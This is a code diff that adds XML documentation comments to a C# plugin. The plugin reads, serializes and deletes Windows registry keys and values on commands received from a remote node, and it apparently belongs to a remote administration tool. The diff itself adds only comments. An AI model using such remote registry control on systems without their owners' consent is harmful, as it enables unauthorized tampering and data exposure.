@@ -26,6 +26,17 @@ namespace Plugin
     }
     public class Main
     {
+
+        /// <summary>
+        /// Gets the root registry hive based on the provided key path.
+        /// </summary>
+        /// <param name="keyPath">The registry key path.</param>
+        /// <returns>The root registry hive based on the provided <paramref name="keyPath"/>.</returns>
+        /// <remarks>
+        /// This method splits the input <paramref name="keyPath"/> and checks the first part to determine the root registry hive.
+        /// If the first part matches any of the predefined registry hive names, it returns the corresponding RegistryHive value.
+        /// If no match is found, it returns null.
+        /// </remarks>
         private static RegistryHive? GetRootKeyName(string keyPath)
         {
             string[] parts = keyPath.Split('\\');
@@ -46,6 +57,21 @@ namespace Plugin
 
             return null;
         }
+
+        /// <summary>
+        /// Retrieves information about a registry key at the specified path.
+        /// </summary>
+        /// <param name="path">The path of the registry key to retrieve information for.</param>
+        /// <returns>A <see cref="RegInfo"/> object containing information about the specified registry key, or null if the key does not exist.</returns>
+        /// <exception cref="System.Security.SecurityException">The user does not have the necessary registry rights.</exception>
+        /// <exception cref="System.ArgumentException">path is longer than the system-defined maximum length.</exception>
+        /// <exception cref="System.ArgumentNullException">path is null.</exception>
+        /// <exception cref="System.ObjectDisposedException">The RegistryKey on which this method is being invoked is closed and access is requested.</exception>
+        /// <remarks>
+        /// This method retrieves information about a registry key at the specified path. It first determines the root key name from the path, then opens the registry key using the 64-bit view.
+        /// It then retrieves various information about the key such as its full path, whether it contains subkeys, and the names and values of its subkeys.
+        /// The method returns a <see cref="RegInfo"/> object containing the retrieved information, or null if the key does not exist.
+        /// </remarks>
         private static RegInfo GetRegInfo(string path)
         {
             RegistryHive? _hive = GetRootKeyName(path);
@@ -114,6 +140,17 @@ namespace Plugin
             { "Unknown", 7 }
         };
 
+        /// <summary>
+        /// Serializes the provided RegInfo object into a byte array.
+        /// </summary>
+        /// <param name="regInfo">The RegInfo object to be serialized.</param>
+        /// <returns>A byte array representing the serialized data of the <paramref name="regInfo"/>.</returns>
+        /// <remarks>
+        /// This method serializes the provided <paramref name="regInfo"/> object into a byte array using a BinaryWriter and MemoryStream.
+        /// It writes various properties and values of the <paramref name="regInfo"/> object into the memory stream in a specific format.
+        /// The serialization process involves writing information about subkeys, full path, values, and their types into the byte array.
+        /// The method returns the resulting byte array containing the serialized data of the <paramref name="regInfo"/> object.
+        /// </remarks>
         public static byte[] SerializeRegInfo(RegInfo regInfo)
         {
             using (MemoryStream memoryStream = new MemoryStream())
@@ -175,6 +212,16 @@ namespace Plugin
                 return memoryStream.ToArray();
             }
         }
+
+        /// <summary>
+        /// Deletes the specified registry subkey.
+        /// </summary>
+        /// <param name="path">The path of the registry subkey to be deleted.</param>
+        /// <returns>True if the registry subkey was successfully deleted; otherwise, false.</returns>
+        /// <remarks>
+        /// This method attempts to delete the specified registry subkey identified by the given <paramref name="path"/>.
+        /// If successful, it returns true; otherwise, it returns false.
+        /// </remarks>
         public bool DeleteRegistrySubkey(string path)
         {
             RegistryHive? _hive= GetRootKeyName(path);
@@ -200,6 +247,17 @@ namespace Plugin
             }
             return worked;
         }
+
+        /// <summary>
+        /// Deletes a registry value from the specified path and key name.
+        /// </summary>
+        /// <param name="path">The path of the registry key.</param>
+        /// <param name="keyname">The name of the registry key to be deleted.</param>
+        /// <returns>True if the registry key was successfully deleted; otherwise, false.</returns>
+        /// <remarks>
+        /// This method attempts to delete the specified registry value from the given path and key name.
+        /// If the operation is successful, it returns true; otherwise, it returns false.
+        /// </remarks>
         public bool DeleteRegistryValue(string path, string keyname)
         {
             RegistryHive? _hive = GetRootKeyName(path);
@@ -235,6 +293,22 @@ namespace Plugin
             }
             return worked;
         }
+
+        /// <summary>
+        /// Asynchronously runs the specified node and handles communication with it.
+        /// </summary>
+        /// <param name="node">The node to be run and communicated with.</param>
+        /// <exception cref="ArgumentNullException">Thrown when the <paramref name="node"/> is null.</exception>
+        /// <returns>A <see cref="Task"/> representing the asynchronous operation.</returns>
+        /// <remarks>
+        /// This method sends a byte array with a value of 3 to indicate that it has connected to the specified <paramref name="node"/>.
+        /// It then enters a loop to continuously receive data from the <paramref name="node"/>.
+        /// Upon receiving data, it checks the first byte of the received data and performs different actions based on its value.
+        /// If the first byte is 1, it receives a byte array representing a path, retrieves registry information for that path using the <see cref="GetRegInfo"/> method, and sends the retrieved information back to the node after serialization.
+        /// If the first byte is 2, it receives a byte array representing a path, attempts to delete the registry subkey at that path using the <see cref="DeleteRegistrySubkey"/> method, and sends the result back to the node.
+        /// If the first byte is 3, it receives byte arrays representing a path and a key name, attempts to delete the registry value at the specified path and key name using the <see cref="DeleteRegistryValue"/> method, and sends the result back to the node.
+        /// If any exceptions occur during these operations, a byte array with a value of 0 is sent back to the node.
+        /// </remarks>
         public async Task Run(Node node)
         {
             await node.SendAsync(new byte[] { 3 });//indicate that it has connected
